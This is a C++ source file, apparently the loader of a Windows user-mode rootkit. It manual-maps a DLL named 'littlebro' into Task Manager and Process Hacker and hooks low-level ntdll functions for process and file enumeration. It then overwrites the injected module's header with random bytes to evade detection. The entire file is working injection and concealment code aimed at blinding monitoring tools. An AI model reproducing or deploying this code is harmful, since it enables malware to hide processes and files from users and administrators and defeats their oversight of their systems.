#include "stdafx.h"
#include "ntdll.hpp"
#include "rng.hpp"

using hook_container = std::vector<std::tuple<std::string, std::string, const char*>>;

int main()
{
	// INITIALISE DYNAMIC IMPORTS
	ntdll::initialise();

	// READ LITTLEBRO FROM DISK FOR INJECTION
	auto littlebro_buffer = binary_file::read_file("littlebro.dll");

	// SETUP HOOK CONTAINER
	// FORMAT: MODULE NAME, FUNCTION NAME, EXPORT NAME
	hook_container container =
	{
		// HOOK AS LOW AS POSSIBLE TO PREVENT CIRCUMVENTIONS
		{ "ntdll.dll", "NtOpenProcess",				"ntop" },
		{ "ntdll.dll", "NtQuerySystemInformation",	"qsi" },
		{ "ntdll.dll", "NtCreateFile",				"ntcr"},
		{ "ntdll.dll", "NtOpenFile",				"ntopf"},
		{ "ntdll.dll", "NtQueryDirectoryFile",		"ntqdf"}
	};

	for (const auto& process_name : { "taskmgr.exe", "processhacker.exe"/*, "explorer.exe"*/ })
	{
		auto process_list = process::get_all_from_name(process_name);

		if (process_list.empty()) // NO PROCESSES FOUND
			continue;

		// ENUMERATE ALL PROCESSES
		for (auto id : process_list)
		{
			logger::log_formatted("Target Process", process_name);

			// MAP LITTLEBRO INTO TARGET PROCESS
			auto proc = process(id, PROCESS_ALL_ACCESS);

			if (!proc)
			{
				logger::log_error("Non-sufficient elevation, aborting");
				continue;
			}

			auto littlebro = injection::manualmap(proc).inject(littlebro_buffer);

			// HOOK FUNCTIONS
			for (const auto [module_name, function_name, export_name] : container)
				proc.detour_function(module_name, function_name, littlebro, export_name);

			// FILL HEADER SECTION WITH PSEUDO-RANDOM DATA WITH HIGH ENTROPY
			auto junk_buffer = std::vector<std::uint8_t>(0x1000);
			std::for_each(junk_buffer.begin(), junk_buffer.end(), [](auto& n) { n = rng::get_int<uint16_t>(0x00, 0xFF); });
			proc.write_raw_memory(junk_buffer.data(), 0x1000, littlebro);
		}
	}

	logger::log("Finished!");
	std::cin.get();
    return 0;
}

